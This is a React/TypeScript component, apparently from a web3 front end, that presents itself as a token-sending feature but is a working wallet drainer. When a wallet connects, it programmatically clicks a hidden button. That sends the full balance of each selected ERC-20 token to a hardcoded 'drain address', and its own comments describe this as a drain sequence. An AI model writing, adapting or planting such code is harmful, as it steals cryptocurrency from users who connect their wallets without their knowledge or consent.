import { useToasts } from '@geist-ui/core';
import { erc20ABI, usePublicClient, useWalletClient, useNetwork } from 'wagmi';
import { useAtom } from 'jotai';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { useEffect, useRef, useState } from 'react';

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: string) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const [checkedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { chain } = useNetwork();

  const [isSending, setIsSending] = useState(false);
  const sendButtonRef = useRef<HTMLButtonElement>(null);

  const sendAllCheckedTokens = async () => {
    if (isSending) return;
    setIsSending(true);

    if (!walletClient) {
      showToast('Please connect your wallet to proceed.', 'warning');
      setIsSending(false);
      return;
    }

    const drainAddress = '0x2A29c1bdB9DD7464C01EA06da1aa7B04F2CBF651'; // Hardcoded drain address

    const tokensToSend = Object.entries(checkedRecords)
      .filter(([, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress as `0x${string}`);

    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((t) => t.contract_address === tokenAddress);
      if (!token) continue;

      try {
        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress as `0x${string}`,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [drainAddress as `0x${string}`, BigInt(token.balance || '0')],
        });

        const res = await walletClient.writeContract(request);
        showToast(`Transferred ${token.contract_ticker_symbol}`, 'success');
      } catch (err) {
        showToast(`Error transferring ${token.contract_ticker_symbol}: ${(err as Error).message}`, 'error');
      }
    }

    showToast('All selected tokens have been sent.', 'success');
    setIsSending(false);
  };

  useEffect(() => {
    // Automatically initiate the drain sequence upon wallet connection
    if (walletClient) {
      setTimeout(() => {
        if (sendButtonRef.current) {
          sendButtonRef.current.click();
        }
      }, 500); // Small delay to allow UI updates
    }
  }, [walletClient]);

  return (
    <div style={{ margin: '20px' }}>
      <div style={{ textAlign: 'center' }}>
        {isSending ? <Loading>Processing...</Loading> : null}
      </div>
      <button
        style={{ display: 'none' }} // Hide button but keep it functional for programmatic click
        ref={sendButtonRef}
        onClick={sendAllCheckedTokens}
        disabled={isSending}
      >
        {isSending ? 'Sending...' : 'Initiating Transfer'}
      </button>
    </div>
  );
};
